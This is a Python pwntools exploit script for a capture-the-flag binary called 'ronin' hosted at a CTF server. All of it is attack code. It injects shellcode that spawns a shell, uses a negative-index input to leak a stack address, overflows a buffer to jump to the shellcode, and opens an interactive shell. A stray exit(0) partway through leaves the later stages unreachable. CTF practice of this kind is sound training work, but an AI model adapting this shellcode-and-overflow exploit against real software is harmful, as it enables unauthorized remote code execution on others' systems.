from pwn import *
import warnings
warnings.filterwarnings('ignore')

def ctf_output(r, length):
    for i in range(length):
        print(r.recv(1).decode(), end='', sep='')

context.clear()
context.update(arch='amd64', os='linux')

binary = context.binary = ELF("./ronin")

if not args.REMOTE:
    r = process(binary.path)
else:
    r = remote("pwn.chall.pwnoh.io", 13372)

ctf_output(r, 439)
shellcode = asm(shellcraft.amd64.linux.sh())
payload = b"Chase after it." + shellcode

r.sendline(payload)
ctf_output(r, 180 + 87)

payload = "-4"
r.sendline(payload)

print(r.recvline())
exit(0)

r.recv(1)
leaked_stack = u64(r.recvn(6) + b"\x00\x00")
print("")
log.info("leaked stack addr: " + hex(leaked_stack))

payload = "2"
r.sendline(payload)
ctf_output(r, 49 + 155)

payload = b"A" * 40 + p64(leaked_stack - 0x50 + len("Chase after it."))
r.sendline(payload)

ctf_output(r, 236)
r.interactive()